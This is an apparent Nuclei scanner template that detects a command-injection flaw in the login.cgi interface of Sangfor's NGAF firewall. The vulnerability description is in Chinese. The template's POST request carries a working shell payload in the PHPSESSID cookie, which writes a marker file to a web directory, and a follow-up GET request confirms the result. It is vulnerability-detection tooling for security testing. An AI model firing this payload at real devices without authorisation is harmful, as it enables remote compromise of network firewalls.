id: sangfor-ngaf-logincgi-rce
info:
  name: Sangfor Next Gen Application Firewall - rce
  author: leadlife
  severity: critical
  description: 深信服下一代防火墙（Next-Generation Application Firewall）NGAF 是面向应用层设计，能够精确识别用户、应用和内容，具备完整安全防护能力，能够全面替代传统防火墙，并具有强劲应用层处理能力的全新网络安全设备。深信服下一代防火墙（Next-Generation Application Firewall）NGAF 的 login.cgi 接口对用户传入的参数未进行有效的过滤，攻击者可利用该漏洞获取服务器的权限。
  reference: 
    - https://github.com/MrWQ/vulnerability-paper/blob/683fcc3ae70e18cb30eadf3ec16982d18f04444f/bugs/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%20%E6%B7%B1%E4%BF%A1%E6%9C%8D%E4%B8%8B%E4%B8%80%E4%BB%A3%E9%98%B2%E7%81%AB%E5%A2%99%20NGAF%20login%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md
    - https://github.com/CRlife/Rscan/blob/0edbf44689fbc876294a7d8603639dfe44fabeee/poc/yaml-poc/poc-yaml-Sangfor-login.cgi-RCE.yaml
  classification:
    cve-id: 
  metadata:
    verified: false
  tags: sangfor,ngaf,waf,iot

variables:
    filename: "{{to_lower(rand_base(4))}}"
    date: '{{date_time("%Y%M%D%H%M%S")}}'

http:
  - raw:
      - |
        POST /cgi-bin/login.cgi HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/44.0.2403.155 Safari/537.36
        Connection: close
        Content-Length: 112
        Content-Type: Application/X-www-Form
        Cookie: PHPSESSID=`$(echo {{randstr}} > /fwlib/sys/virus/webui/svpn_html/{{filename}}.txt)`;
        Accept-Encoding: gzip

        {"opr":"login", "data":{"user": "watchTowr" , "pwd": "watchTowr" , "vericode": "EINW" , "privacy_enable": "0"}}
      
      - |+
        GET /svpn_html/{{filename}}.txt HTTP/1.1
        Host: {{Hostname}}
        
    matchers:
      - type: dsl
        dsl:
          - status_code_1 == 200 && status_code_2 == 200
          - contains_all(body_2,'{{randstr}}')
        condition: and